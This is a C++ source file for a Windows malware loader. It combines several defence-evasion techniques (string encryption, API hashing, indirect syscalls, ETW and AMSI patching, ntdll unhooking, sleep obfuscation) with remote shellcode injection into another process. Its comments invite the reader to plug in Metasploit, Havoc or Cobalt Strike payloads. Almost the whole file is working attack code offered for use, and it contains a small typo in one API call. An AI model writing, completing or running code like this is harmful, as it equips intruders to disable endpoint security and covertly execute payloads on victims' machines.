#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <vector>
#include <memory>

#pragma comment(lib, "ntdll.lib")

// string XOR encryption
// compile time key, decrypt at runtime, static strings never land in plaintext
constexpr uint8_t XOR_KEY = 0xAB;

std::string xor_decrypt(const uint8_t* data, size_t len) {
    std::string out(len, '\0');
    for (size_t i = 0; i < len; i++) out[i] = data[i] ^ XOR_KEY;
    return out;
}

#define ENC(s) []() { \
    constexpr size_t N = sizeof(s) - 1; \
    uint8_t buf[N]; \
    for (size_t i = 0; i < N; i++) buf[i] = ((uint8_t)s[i]) ^ XOR_KEY; \
    return xor_decrypt(buf, N); }()

// import hashing (djb2)
// resolve APIs without calling GetProcAddress by name — bypass import-name scan
constexpr uint32_t djb2(const char* s) {
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) + (uint8_t)*s++;
    return h;
}

FARPROC resolve_export(HMODULE mod, uint32_t target_hash) {
    auto base = reinterpret_cast<uint8_t*>(mod);
    auto dos   = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    auto nt    = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    auto& edir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto  exp  = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(base + edir.VirtualAddress);

    auto names    = reinterpret_cast<uint32_t*>(base + exp->AddressOfNames);
    auto ordinals = reinterpret_cast<uint16_t*>(base + exp->AddressOfNameOrdinals);
    auto funcs    = reinterpret_cast<uint32_t*>(base + exp->AddressOfFunctions);

    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        const char* name = reinterpret_cast<const char*>(base + names[i]);
        if (djb2(name) == target_hash)
            return reinterpret_cast<FARPROC>(base + funcs[ordinals[i]]);
    }
    return nullptr;
}


// indirect syscalls
// extract SSN from ntdll, build a stub, call kernel directly
// slips past EDR hooks sitting in ntdll usermode layer
struct SyscallStub {
    uint8_t  code[24];
    uint32_t ssn;
};

uint32_t get_ssn(const char* func_name) {
    HMODULE ntdll = GetModuelHandleA("ntdll.dll");
    auto fn = reinterpret_cast<uint8_t*>(GetProcAddress(ntdll, func_name));
    if (!fn) return 0xFFFFFFFF;
    // mov eax, <SSN> is at offset 4 in a standard Nt* stub
    // if hooked (jmp at byte 0), walk syscall stubs to find SSN by neighbor
    if (fn[0] == 0xE9 || fn[0] == 0xFF) {
        for (int delta = 1; delta < 500; delta++) {
            if (fn[delta * 32] == 0x4C && fn[delta * 32 + 1] == 0x8B &&
                fn[delta * 32 + 2] == 0xD1 && fn[delta * 32 + 3] == 0xB8)
                return *reinterpret_cast<uint32_t*>(fn + delta * 32 + 4) - delta;
            if (fn[-delta * 32] == 0x4C && fn[-delta * 32 + 1] == 0x8B &&
                fn[-delta * 32 + 2] == 0xD1 && fn[-delta * 32 + 3] == 0xB8)
                return *reinterpret_cast<uint32_t*>(fn - delta * 32 + 4) + delta;
        }
        return 0xFFFFFFFF;
    }
    return *reinterpret_cast<uint32_t*>(fn + 4);
}


// x64 syscall stub, written to executable memory at runtime
// mov r10, rcx | mov eax, ssn | syscall | ret
static const uint8_t STUB_TEMPLATE[] = {
    0x4C, 0x8B, 0xD1,              // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, <SSN>  <- patched
    0x0F, 0x05,                    // syscall
    0xC3                           // ret
};

void* build_stub(uint32_t ssn) {
    void* mem = VirtualAlloc(nullptr, sizeof(STUB_TEMPLATE),
                             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return nullptr;
    memcpy(mem, STUB_TEMPLATE, sizeof(STUB_TEMPLATE));
    *reinterpret_cast<uint32_t*>(static_cast<uint8_t*>(mem) + 4) = ssn;
    return mem;
}

// typed wrappers, cast stub pointer and call like a real Nt function
using NtAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(HANDLE, PVOID*, ULONG_PTR,
                                                    PSIZE_T, ULONG, ULONG);
using NtWriteVirtualMemory_t    = NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID,
                                                    SIZE_T, PSIZE_T);
using NtProtectVirtualMemory_t  = NTSTATUS(NTAPI*)(HANDLE, PVOID*, PSIZE_T,
                                                    ULONG, PULONG);
using NtCreateThreadEx_t        = NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK,
                                                    PVOID, HANDLE, PVOID, PVOID,
                                                    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// ETW patching
// patch EtwEventWrite to ret immediately, kills usermode event telemetry
// EDR sensors that rely on ETW stop seeing your allocations and thread creates
bool patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto etw = reinterpret_cast<uint8_t*>(GetProcAddress(ntdll, "EtwEventWrite"));
    if (!etw) return false;

    DWORD old_prot;
    if (!VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_prot)) return false;
    *etw = 0xC3; // ret — function returns immediately, no events written
    VirtualProtect(etw, 1, old_prot, &old_prot);
    return true;
}

// AMSI bypass
// patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
// stops PowerShell / .NET AMSI hooks from scanning your shellcode
bool patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return true; // not loaded — not a threat

    auto scan = reinterpret_cast<uint8_t*>(
        GetProcAddress(amsi, "AmsiScanBuffer"));
    if (!scan) return false;

    // mov eax, 0x80070057 (E_INVALIDARG) ; ret
    // AMSI treats E_INVALIDARG as clean, scan never fires
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old_prot;
    VirtualProtect(scan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old_prot);
    memcpy(scan, patch, sizeof(patch));
    VirtualProtect(scan, sizeof(patch), old_prot, &old_prot);
    return true;
}

// ntdll unhooking
// map a fresh ntdll from disk, copy .text section over the loaded (hooked) copy
// EDR hooks live in the in-memory ntdll — fresh disk copy has clean stubs
bool unhook_ntdll() {
    // open ntdll on disk
    wchar_t path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, L"\\ntdll.dll");

    HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                              nullptr, OPEN_EXISTING, 0, nullptr);
    if (file == INVALID_HANDLE_VALUE) return false;

    HANDLE mapping = CreateFileMappingW(file, nullptr, PAGE_READONLY | SEC_IMAGE,
                                        0, 0, nullptr);
    CloseHandle(file);
    if (!mapping) return false;

    auto fresh = reinterpret_cast<uint8_t*>(
        MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0));
    CloseHandle(mapping);
    if (!fresh) return false;

    HMODULE loaded = GetModuleHandleA("ntdll.dll");
    auto loaded_base = reinterpret_cast<uint8_t*>(loaded);

    // locate .text section in both copies, copy fresh over hooked
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(fresh);
    auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>(fresh + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);

    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            DWORD old_prot;
            VirtualProtect(loaded_base + sec->VirtualAddress,
                           sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old_prot);
            memcpy(loaded_base + sec->VirtualAddress,
                   fresh + sec->VirtualAddress,
                   sec->Misc.VirtualSize);
            VirtualProtect(loaded_base + sec->VirtualAddress,
                           sec->Misc.VirtualSize,
                           old_prot, &old_prot);
            break;
        }
    }

    UnmapViewOfFile(fresh);
    return true;
}

// Ekko style sleep obfuscation
// encrypt shellcode in memory while sleeping, decrypt before next execution
// memory scanners that run during idle periods see only garbage bytes
void obfuscated_sleep(void* shellcode_base, size_t shellcode_size,
                      DWORD sleep_ms) {
    // XOR encrypt shellcode in place before sleeping
    auto sc = reinterpret_cast<uint8_t*>(shellcode_base);
    for (size_t i = 0; i < shellcode_size; i++) sc[i] ^= XOR_KEY;

    // flip region to RW (no-execute) so scanners see non-exec memory
    DWORD old_prot;
    VirtualProtect(shellcode_base, shellcode_size, PAGE_READWRITE, &old_prot);

    Sleep(sleep_ms);

    // restore RX and decrypt
    VirtualProtect(shellcode_base, shellcode_size, old_prot, &old_prot);
    for (size_t i = 0; i < shellcode_size; i++) sc[i] ^= XOR_KEY;
}

// full evasion init 
// call this before any payload work
// returns false if a critical step failed
struct EvasionResult {
    bool etw_ok;
    bool amsi_ok;
    bool unhook_ok;
    bool syscalls_ok;
};

EvasionResult evasion_init(
    void*& out_alloc_stub,
    void*& out_write_stub,
    void*& out_protect_stub,
    void*& out_thread_stub)
{
    EvasionResult r{};

    r.unhook_ok  = unhook_ntdll();
    r.etw_ok     = patch_etw();
    r.amsi_ok    = patch_amsi();

    uint32_t ssn_alloc   = get_ssn("NtAllocateVirtualMemory");
    uint32_t ssn_write   = get_ssn("NtWriteVirtualMemory");
    uint32_t ssn_protect = get_ssn("NtProtectVirtualMemory");
    uint32_t ssn_thread  = get_ssn("NtCreateThreadEx");

    r.syscalls_ok = (ssn_alloc != 0xFFFFFFFF && ssn_write != 0xFFFFFFFF &&
                     ssn_protect != 0xFFFFFFFF && ssn_thread != 0xFFFFFFFF);

    if (r.syscalls_ok) {
        out_alloc_stub   = build_stub(ssn_alloc);
        out_write_stub   = build_stub(ssn_write);
        out_protect_stub = build_stub(ssn_protect);
        out_thread_stub  = build_stub(ssn_thread);
    }

    return r;
}


// inject shellcode via indirect syscalls
bool inject_shellcode(DWORD target_pid,
                      const uint8_t* sc, size_t sc_len,
                      DWORD beacon_interval_ms = 5000) {
    void *alloc_s, *write_s, *protect_s, *thread_s;
    auto res = evasion_init(alloc_s, write_s, protect_s, thread_s);
    if (!res.syscalls_ok) return false;

    auto NtAlloc   = reinterpret_cast<NtAllocateVirtualMemory_t>(alloc_s);
    auto NtWrite   = reinterpret_cast<NtWriteVirtualMemory_t>(write_s);
    auto NtProtect = reinterpret_cast<NtProtectVirtualMemory_t>(protect_s);
    auto NtThread  = reinterpret_cast<NtCreateThreadEx_t>(thread_s);

    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!proc) return false;

    // allocate RW (not RWX — avoids RWX heuristic)
    PVOID  remote_base = nullptr;
    SIZE_T region_size = sc_len;
    NtAlloc(proc, &remote_base, 0, &region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // write shellcode
    SIZE_T written;
    NtWrite(proc, remote_base, const_cast<uint8_t*>(sc), sc_len, &written);

    // flip to RX — post-write, avoids write+exec at same time
    ULONG old_prot;
    NtProtect(proc, &remote_base, &region_size, PAGE_EXECUTE_READ, &old_prot);

    // sleep-obfuscate our own beacon region between calls
    obfuscated_sleep(const_cast<uint8_t*>(sc), sc_len, beacon_interval_ms);

    // spawn thread via indirect syscall
    HANDLE thread = nullptr;
    NTSTATUS status = NtThread(&thread, THREAD_ALL_ACCESS, nullptr,
                                proc, remote_base, nullptr,
                                0, 0, 0, 0, nullptr);

    CloseHandle(proc);
    return NT_SUCCESS(status);
}


int main() {
    // drop your shellcode here — msfvenom, Havoc, Cobalt Strike, whatever
    uint8_t shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP NOP RET placeholder

    // target PID — enumerate via CreateToolhelp32Snapshot for stealth
    DWORD target_pid = 1234; // replace

    inject_shellcode(target_pid, shellcode, sizeof(shellcode));
    return 0;
}